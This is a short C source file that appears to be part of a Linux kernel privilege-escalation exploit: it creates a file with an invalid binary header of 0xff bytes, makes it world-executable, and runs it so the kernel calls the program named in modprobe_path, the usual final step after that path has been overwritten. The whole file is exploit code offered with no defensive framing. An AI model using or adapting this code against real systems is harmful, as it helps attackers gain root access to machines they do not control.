#include <stdio.h>
#include <fcntl.h>

#define PROC_MODPROBE_TRIGGER "./fake_mod"
void modprobe_init()
{
  int fd = open(PROC_MODPROBE_TRIGGER, O_RDWR | O_CREAT);
  if (fd < 0)
  {
      perror("trigger creation failed");
      exit(-1);
  }
  char root[] = "\xff\xff\xff\xff";
  write(fd, root, sizeof(root));
  close(fd);
  chmod(PROC_MODPROBE_TRIGGER, 0777);
}

void modprobe_trigger()
{
  execve(PROC_MODPROBE_TRIGGER, NULL, NULL);
}

int main()
{
  modprobe_init();
  modprobe_trigger();
  return 0;
}
